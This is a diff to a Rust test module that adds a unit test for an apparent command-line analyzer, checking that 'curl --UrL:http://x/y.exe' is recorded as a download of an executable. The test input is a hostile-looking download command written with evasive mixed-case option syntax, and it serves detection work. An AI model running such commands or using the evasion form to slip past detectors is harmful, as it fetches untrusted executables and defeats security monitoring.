@@ -5762,6 +5762,18 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_with_mixed_case_url_colon_records_src() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line("curl --UrL:http://x/y.exe", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst: None, .. } if src == "http://x/y.exe"
+            )
+        });
+        assert!(has, "traits: {:?}", env.traits);
+    }
+
+    #[test]
     fn curl_data_payload_does_not_become_download_src() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
